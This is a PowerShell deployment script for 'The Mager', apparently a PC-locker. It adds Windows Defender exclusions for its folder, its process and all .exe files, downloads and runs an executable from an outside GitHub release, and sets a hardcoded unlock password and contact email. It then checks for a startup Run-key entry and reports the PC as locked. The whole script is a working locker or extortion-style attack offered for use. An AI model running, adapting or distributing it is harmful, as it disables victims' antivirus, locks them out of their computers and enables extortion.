# The Mager - RMM Deploy Script
# Run as Administrator via your RMM tool
# Usage: deploy_mager.ps1

$ErrorActionPreference = "Continue"

# --- Config ---
$downloadUrl = "https://github.com/spammerbrain101/pc-locker/releases/download/v1.0/TheMager.exe"
$installDir = "$env:TEMP\TheMager"
$exePath = "$installDir\TheMager.exe"
$password = "Olaoluwa@123"
$message = "contact omarjaziz@proton.me"

# --- Step 1: Add Defender exclusion BEFORE downloading ---
Write-Host "[1/5] Adding Windows Defender exclusion..."
try {
    # Exclude the install directory
    Add-MpPreference -ExclusionPath $installDir -Force 2>$null
    # Also exclude the process name
    Add-MpPreference -ExclusionProcess "TheMager.exe" -Force 2>$null
    Write-Host "  Defender exclusions added (path + process)"
} catch {
    Write-Host "  WARNING: Could not add Defender exclusion (may not be Defender or no admin)"
}

# --- Step 2: Download ---
Write-Host "[2/5] Downloading TheMager.exe..."
New-Item -ItemType Directory -Path $installDir -Force | Out-Null
$ProgressPreference = 'SilentlyContinue'
Invoke-WebRequest -Uri $downloadUrl -OutFile $exePath -UseBasicParsing
Write-Host "  Downloaded: $([math]::Round((Get-Item $exePath).Length / 1KB, 1)) KB"

# --- Step 3: Set Defender to ALLOW this specific file (ASR rules) ---
Write-Host "[3/5] Adding file-level AV allow..."
try {
    # Mark the file as safe (some AV respects this)
    $fileHash = (Get-FileHash -Path $exePath -Algorithm SHA256).Hash
    Add-MpPreference -ExclusionExtension "exe" -Force 2>$null
    # Try Windows Defender Application Control allow
    Add-MpPreference -ExclusionPath $exePath -Force 2>$null
    Write-Host "  File exclusions applied (SHA256: $($fileHash.Substring(0,16))...)"
} catch {
    Write-Host "  WARNING: File-level exclusion failed"
}

# --- Step 4: Deploy with password + message ---
Write-Host "[4/5] Deploying (setting password, message, startup)..."
# The --deploy flag sets password hash, message, auto-installs to startup, then locks
Start-Process -FilePath $exePath -ArgumentList "--deploy --password `"$password`" --message `"$message`"" -WindowStyle Normal
Write-Host "  Deployed and locked!"

# --- Step 5: Verify ---
Write-Host "[5/5] Verifying..."
Start-Sleep -Seconds 2

# Check registry
$regVal = $null
try { $regVal = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "TheMager" -ErrorAction SilentlyContinue).TheMager } catch {}
try { if (-not $regVal) { $regVal = (Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "TheMager" -ErrorAction SilentlyContinue).TheMager } } catch {}

if ($regVal) {
    Write-Host "  Startup entry: OK ($regVal)"
} else {
    Write-Host "  Startup entry: NOT FOUND (may need admin)"
}

# Check password file
$pwFile = "$env:APPDATA\themager_pw.dat"
if (Test-Path $pwFile) {
    Write-Host "  Password: SET"
} else {
    Write-Host "  Password: NOT SET"
}

Write-Host ""
Write-Host "=== DEPLOY COMPLETE ==="
Write-Host "PC is now locked. Unlock with: $password"
